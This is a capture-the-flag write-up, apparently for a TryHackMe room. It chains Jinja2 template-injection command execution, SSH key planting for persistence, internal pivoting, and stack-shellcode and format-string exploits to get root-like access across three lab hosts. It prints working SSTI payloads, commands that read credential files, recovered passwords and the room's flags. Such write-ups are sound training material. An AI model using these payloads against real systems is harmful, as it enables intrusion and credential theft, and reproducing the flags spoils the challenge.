---
Status: "#Complete"
OS: linux
ip: 10.66.144.79
Start_Time: 2026-03-25 15:14
---

## Recon

### 1. Port Discovery
	I started with a fast scan across the top 1000 TCP ports to get a quick view of the exposed services before committing time to a full-port scan.

~~~bash
nmap -Pn --top-ports 1000 -T4 10.66.144.79 -oN /tmp/thm_top1000.txt
~~~

![](<assets/{3C74B711-D1F3-41A9-ACA5-5FB191DF40E9}.png>)

	The quick discovery result showed only two interesting ports: '22/tcp' and '8080/tcp'.

### 2. Service Detection
	After identifying the two open ports, I followed up with service/version detection and the default NSE script set against only those ports.

~~~bash
nmap -Pn -sC -sV -p22,8080 10.66.144.79 -oN /tmp/thm_sv.txt
~~~

![](<assets/{BBEF977B-534F-4196-B1ED-5CB67D839386}.png>)

	This result confirmed three useful points:
- The target is an Ubuntu-based Linux host.
- SSH is present but not yet actionable without credentials.
- Port '8080' is running a Python web stack using Werkzeug on Python 2.7.17.

### 3. Web Enumeration
	With port '8080' identified as the most interesting service, I inspected the root page, checked the allowed methods, and brute-forced common paths.

~~~bash
curl -i -s --max-time 10 http://10.66.144.79:8080/ | head -n 40
nmap -Pn -p8080 --script http-enum,http-methods 10.66.144.79 -oN /tmp/thm_http_enum.txt
gobuster dir -q -u http://10.66.144.79:8080 -w /usr/share/wordlists/dirb/common.txt -t 20 -k
~~~

![](<assets/{E7113D4F-37BC-4964-9276-9FB53A9F7367}.png>)
![](<assets/{CB75527C-432A-427F-9272-DBEA88112C5A}.png>)

	The root page was a custom challenge page rather than a default landing page. Directory brute force did not produce useful routes, which pushed the assessment toward hidden parameters and application logic rather than exposed paths.

## Vulnerability Identification

### 1. Hidden Parameter Discovery
	The root page did not expose an obvious form or query string, so I treated hidden GET parameters as the next likely attack surface. I enumerated common parameter names against the base route and filtered out the baseline response size.

~~~bash
ffuf -u 'http://10.66.144.79:8080/?FUZZ=test' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -fs 1247 -mc all -t 40
~~~

![](<assets/{D0E9724F-F686-4331-8F36-F4A703E67650}.png>)

	This identified 'key' as a meaningful parameter because requests using '?key=test' produced a response that differed from the baseline body.

### 2. SSTI Validation
	After confirming that 'key' influenced server-side behavior, I tested whether the parameter was reflected safely or actually evaluated as a template. Submitting '{{7*7}}' returned '49', which confirmed server-side expression execution. Querying 'config.items()' then fingerprinted the stack as Flask and Jinja.

~~~bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{7*7}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{config.items()}}'
~~~

![](<assets/Pasted image 20260325182201.png>)

### 3. Command Execution as minos
	I validated code execution by importing 'os' through Jinja2 globals and running 'id'. The response confirmed that the web process was running as 'minos'.

~~~bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("id").read()}}'
~~~

![](<assets/{F3916EF2-88A2-4ABB-8CA6-73662EA17424}.png>)

### 4. minos Enumeration
	With command execution established, I enumerated the host and the 'minos' home directory. The home directory contained the challenge-specific files 'Crete_Shores' and 'Minos_Flag'.

~~~bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("whoami;id;hostname;uname -a").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("ls -la /home/minos").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("cat /home/minos/Minos_Flag").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("cat /home/minos/Crete_Shores").read()}}'
~~~

![](<assets/{51764C4A-3FE2-46C9-AE7B-5A26C728FE77}.png>)
![](<assets/{42EFB247-90B1-4A9F-907B-14979E9BB80E}.png>)
![](<assets/{44EE3854-3F46-41F0-B11A-E66B9AA9B55A}.png>)
![](<assets/{3D96027D-BA6C-4BE8-AE4E-6C74C1CB7DE6}.png>)

~~~text
Username: entrance
Password: Knossos
~~~

## Privilege Escalation

### 1. minos
	A 'sudo -l' check on 'minos' showed that the user could run '/usr/bin/nmap' as root without a password. The real value of this access was internal network discovery rather than a direct local root path.

~~~bash
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("sudo -l 2>/dev/null").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("ifconfig -a").read()}}'
curl -G -s 'http://10.66.144.79:8080/' --data-urlencode 'key={{cycler.__init__.__globals__.os.popen("sudo nmap -sn 10.71.235.0/24").read()}}'
~~~

~~~text
User minos may run the following commands on Minos:
    (root) NOPASSWD: /usr/bin/nmap
~~~

~~~text
eth0: ... inet 10.71.235.7 ...
~~~

~~~text
Nmap scan report for ip-10-71-235-1.ec2.internal (10.71.235.1)
Nmap scan report for Athens.lxd (10.71.235.37)
Nmap scan report for Labyrinth.lxd (10.71.235.159)
Nmap scan report for Minos.lxd (10.71.235.7)
~~~

	The internal subnet revealed two new hosts, 'Athens.lxd' and 'Labyrinth.lxd', which made the recovered 'entrance / Knossos' credential the next pivot candidate.

### 2. entrance on Labyrinth
	From 'Minos', I scanned the internal hosts and found that both 'Athens' and 'Labyrinth' exposed SSH. The recovered credential failed against 'Athens' but worked successfully against 'Labyrinth'.

~~~bash
sudo nmap -Pn --top-ports 1000 -T4 10.71.235.37
sudo nmap -Pn --top-ports 1000 -T4 10.71.235.159
DISPLAY=dummy SSH_ASKPASS=/tmp/ap.sh SSH_ASKPASS_REQUIRE=force \
setsid ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o StrictHostKeyChecking=no entrance@10.71.235.159 whoami < /dev/null
~~~

~~~text
Athens.lxd (10.71.235.37)
22/tcp open ssh
~~~

~~~text
Labyrinth.lxd (10.71.235.159)
22/tcp open ssh
~~~

~~~text
entrance
~~~

	To simplify the rest of the attack path, I generated a new key on Kali and appended the public key to both '/home/minos/.ssh/authorized_keys' and '/home/entrance/.ssh/authorized_keys'. This created a stable route from Kali to Minos and then to Labyrinth.

~~~bash
ssh -i ~/.ssh/theseus_pivot minos@10.66.144.79 whoami
ssh -i ~/.ssh/theseus_pivot \
  -o ProxyCommand='ssh -i ~/.ssh/theseus_pivot -W %h:%p minos@10.66.144.79' \
  entrance@10.71.235.159 whoami
~~~

~~~text
minos
entrance
~~~

### 3. minotaur
	On 'Labyrinth', the 'entrance' user had a direct sudo path to the local binary '/home/entrance/labyrinth'. Static analysis showed a leaked stack address and an oversized read into a smaller buffer with executable stack permissions, making this a stack-shellcode challenge.

~~~bash
sudo -l
ls -la /home
find /home -maxdepth 2 -type f 2>/dev/null | sort
~~~

~~~text
User entrance may run the following commands on Labyrinth:
    (minotaur) NOPASSWD: /home/entrance/labyrinth
~~~

~~~text
/home/ariadne/Minotaur_Flag
/home/ariadne/TheReturn
/home/entrance/Entrance
/home/entrance/labyrinth
/home/minotaur/Labyrinth_Flag
/home/minotaur/Minotaur
/home/minotaur/ariadne
/home/minotaur/thread
~~~

~~~text
labyrinth():
sub rsp, 0x1a0
printf("The Secret of the Labyrinth is = %#018x", esp)
read(0, buffer, 0x320)
~~~

~~~text
GNU_STACK ... RWE
~~~

	The exploit was driven interactively from Kali through a raw SSH TTY so the payload bytes were not mangled by line discipline. Returning into the leaked stack buffer produced a working 'minotaur' shell.

~~~text
=== off=0x0 ret=0x7fffffffea00 ===
uid=1002(minotaur) gid=1002(minotaur) groups=1002(minotaur)
~~~

	Once in the 'minotaur' shell, I retrieved the Labyrinth flag and identified the next sudo rule.

~~~bash
id
whoami
cat /home/minotaur/Labyrinth_Flag
sudo -l
~~~

~~~text
uid=1002(minotaur) gid=1002(minotaur) groups=1002(minotaur)
minotaur
THM{6154ea526254375613650183962bf431}
~~~

~~~text
User minotaur may run the following commands on Labyrinth:
    (ariadne) NOPASSWD: /home/minotaur/thread
~~~

### 4. ariadne
	The next stage binary, '/home/minotaur/thread', was another non-PIE ELF. Static analysis confirmed that it read attacker-controlled input with 'fgets()', passed it directly into 'printf()', and then called 'exit()'. It also contained a helper function named 'ariadne()' that opened and printed the protected 'ariadne' file.

~~~text
thread():
fgets(buf, 0x200, stdin)
printf(buf)
exit(1)
~~~

~~~text
ariadne():
fopen("ariadne", "r")
_IO_getc(...)
putchar(...)
~~~

	I first verified where attacker-controlled bytes landed in the argument list. A probe payload showed that the direct format string content started appearing around the sixth argument, while appended data became reachable at positions '29' and '30'. This gave a stable way to reference attacker-supplied addresses with positional specifiers.

~~~text
START|0x7fffffffe9b0|0x7ffff7dd18d0|0x1f|0x602329|(nil)|0x31257c5452415453|...
...
0x4141414c4941547c|0x4242424241414141|0x4444444443434343|TAILAAAAAAABBBBCCCCDDDD
~~~

	Because 'thread()' always called 'exit(1)' after 'printf()', I overwrote 'exit@GOT' at '0x601050' with the address of 'ariadne()' at '0x400727' using four 16-bit writes.

~~~text
%11$hn%12$hn%6$64c%13$hn%6$1767c%14$hn
[padding]
[0x601054][0x601056][0x601052][0x601050]
~~~

	To ensure the helper function opened the correct file, I ran the vulnerable binary from '/home/minotaur'.

~~~bash
cd /home/minotaur
python3 -c "import base64,sys;sys.stdout.buffer.write(base64.b64decode('<payload_b64>'))" | sudo -u ariadne ./thread
~~~

~~~text
Username: ariadne
Password: TheLover
~~~

	Using the recovered credential, I switched to 'ariadne' and read the next flag.

~~~bash
su ariadne
cat /home/ariadne/Minotaur_Flag
cat /home/ariadne/TheReturn
~~~

~~~text
THM{c307b8045208fac06b9faa90e68d2ad4}
~~~

### 5. shore on Athens
	In '/home/ariadne', I found a suspicious file named 'ariadne' with no extension. It did not identify cleanly at first, but inspecting its header showed that the first bytes of a JPEG and JFIF file had been stripped or zeroed.

~~~bash
file /home/ariadne/ariadne
strings -n 8 /home/ariadne/ariadne | head -n 20
xxd -l 96 /home/ariadne/ariadne
~~~

~~~text
/home/ariadne/ariadne: data
~~~

	After reconstructing the missing JPEG header, the image rendered correctly and displayed the words 'Shore' and 'KingAegeus'. I tested the obvious combinations over SSH to 'Athens.lxd', and the working credential was 'shore / KingAegeus'.

~~~text
Username: shore
Password: KingAegeus
~~~

## Post Exploitation

### 1. Athens
	From 'Labyrinth', I used an 'SSH_ASKPASS' helper to authenticate to '10.71.235.37' as 'shore' and recover the final flag.

~~~bash
DISPLAY=dummy SSH_ASKPASS=/tmp/ap2.sh SSH_ASKPASS_REQUIRE=force \
setsid ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no \
-o NumberOfPasswordPrompts=1 -o StrictHostKeyChecking=no \
shore@10.71.235.37 whoami < /dev/null
cat /home/shore/Athens_flag
cat /home/shore/BlackSails
~~~

~~~text
shore
uid=1001(shore) gid=1001(shore) groups=1001(shore)
Athens
~~~

~~~text
THM{bb2af471e0aea04e982c2e5d0a6fa404}
~~~

## Result

### 1. Attack Path Summary
- SSTI on the initial web service led to command execution as 'minos'.
- 'minos' disclosed 'entrance / Knossos' and internal hostnames through local file reads and internal network scanning.
- 'entrance' on 'Labyrinth' escalated to 'minotaur' via the vulnerable 'labyrinth' binary.
- 'minotaur' escalated to 'ariadne' by exploiting the format string bug in 'thread'.
- 'ariadne' disclosed the clue that led to 'shore / KingAegeus' on 'Athens'.
- 'shore' on 'Athens' provided the final host and the last flag.

### 2. Flags
| Flag Type          | Flag Content                          | Screenshot (Link) |
| :----------------- | :------------------------------------ | :---------------- |
| **Minos_Flag**     | THM{499a89a2a064426921732e7d31bc08a}  |                   |
| **Labyrinth_Flag** | THM{6154ea526254375613650183962bf431} |                   |
| **Minotaur_Flag**  | THM{c307b8045208fac06b9faa90e68d2ad4} |                   |
| **Athens_flag**    | THM{bb2af471e0aea04e982c2e5d0a6fa404} |                   |

### 3. Completion Checklist
- [x] Confirm SSTI and gain command execution as 'minos'.
- [x] Recover 'Minos_Flag'.
- [x] Pivot to 'Labyrinth' with 'entrance / Knossos'.
- [x] Exploit 'labyrinth' to obtain a 'minotaur' shell.
- [x] Recover 'Labyrinth_Flag'.
- [x] Exploit 'thread' to retrieve 'ariadne / TheLover'.
- [x] Switch to 'ariadne' and recover 'Minotaur_Flag'.
- [x] Repair the hidden JPEG clue and derive 'shore / KingAegeus'.
- [x] Log in to 'Athens' and recover 'Athens_flag'.

## Conclusion

	This room was a clean chained attack path that combined web exploitation, internal pivoting, and binary exploitation. The initial breakthrough came from identifying the hidden 'key' parameter and confirming Jinja2 SSTI on the Werkzeug service. That foothold exposed both the first flag and the credentials needed to move deeper into the environment.

	The privilege escalation phase was split across multiple hosts and required different exploitation styles at each stage: shellcode injection for 'labyrinth', format string exploitation for 'thread', and clue extraction from a repaired image to reach 'Athens'. The final result was full completion of the room and recovery of all four flags.
